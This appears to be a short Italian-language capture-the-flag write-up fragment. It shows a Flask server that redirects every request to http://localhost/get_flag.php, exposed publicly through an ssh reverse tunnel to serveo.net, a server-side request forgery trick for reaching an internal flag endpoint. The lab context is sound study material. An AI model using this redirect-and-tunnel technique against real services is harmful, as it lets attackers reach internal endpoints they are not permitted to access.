Ho creato un server Flask

```jsx
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def redirect_to_localhost():
    return redirect("http://localhost/get_flag.php", code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
```

Questa fa un redirect a localhost/get_flag.php

Attraverso il comando ssh -R 80:localhost:3000 [serveo.net](http://serveo.net/) Avvio il serer serveo.net sulla porta 3000. In questo modo tutte le richieste fatte a questo server saranno reindirizzate al localhost/get_flag.php